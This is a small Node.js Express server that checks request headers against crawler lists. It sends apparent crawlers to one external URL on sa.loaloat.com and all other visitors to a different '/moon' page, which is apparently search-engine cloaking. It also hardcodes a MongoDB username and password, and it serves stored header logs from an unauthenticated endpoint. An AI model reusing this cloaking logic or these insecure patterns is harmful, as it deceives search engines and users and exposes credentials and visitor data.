require("dotenv").config();
require("ejs");
const express = require("express");
const app = express();
const mongoose = require("mongoose");
app.use(express.static(__dirname + "/views"));
app.use(express.json());
app.set("view engine", "ejs");
const logModel = require("./models/log");

const crawlersArr = require("./utils/crawlers/crawlers");
const userEgentsArr = require("./utils/crawlers/userEgent");

app.get("/", async (req, res, next) => {
  const headerObj = Object.assign(req.headers);
  let matching = false;
  for (let i = 0; i < crawlersArr.length; i++) {
    for (let j = 0; j < userEgentsArr.length; j++) {
      const x = userEgentsArr[j].toLowerCase();
      if (headerObj.hasOwnProperty(x)) {
        matching = RegExp(crawlersArr[i], "g").test(headerObj[x]);
        if (matching) {
          console.log(j);
          break;
        }
      }
    }
    if (matching) {
      console.log(i);
      return res.redirect("https://sa.loaloat.com/");
    }
  }
  res.redirect("https://sa.loaloat.com/moon");
});
app.get("/api/getInfo", async (req, res, next) => {
  const txt = JSON.stringify(req.headers);
  try {
    const log = await logModel.find();
    res.send(log);
  } catch (err) {
    console.log(err);
  }
});
connectDb = async () => {
  try {
    await mongoose.connect(
      "mongodb+srv://ghazi:ghazi@cluster0.xbrxn.mongodb.net/test?retryWrites=true&w=majority"
    );
    console.log("db connect successfully!");
  } catch (err) {
    console.log(err);
  }
};

const PORT = process.env.PORT;

console.log(PORT);
// connectDb();
app.listen(PORT, () => {
  console.log("server is runiing on port 3000");
});
